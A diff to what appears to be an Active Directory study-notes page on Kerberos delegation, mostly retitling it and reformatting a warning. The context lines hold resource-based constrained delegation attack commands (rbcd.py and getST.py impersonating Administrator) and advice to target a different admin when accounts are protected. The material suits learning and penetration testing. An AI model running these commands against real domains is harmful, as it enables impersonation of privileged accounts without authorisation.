@@ -1,6 +1,11 @@
 ---
-title: "Kerberos Delegation"
+title: "Kerberos Delegation Quick Reference"
+description: "Organized Active Directory study notes and reference."
 ---
+
+{/* Generated from Active Directory/Reference/Kerberos Delegation Quick Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 Delegation lets a service act on behalf of a user. Misconfigured, it leads straight to impersonation of privileged accounts.
 
@@ -30,6 +35,5 @@ rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PAS
 getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
 ```
 
-<Warning>
-S4U impersonation of accounts marked "sensitive / cannot be delegated" (or Protected Users) will fail — pick a different admin.
-</Warning>
+
+> S4U impersonation of accounts marked "sensitive / cannot be delegated" (or Protected Users) will fail — pick a different admin.
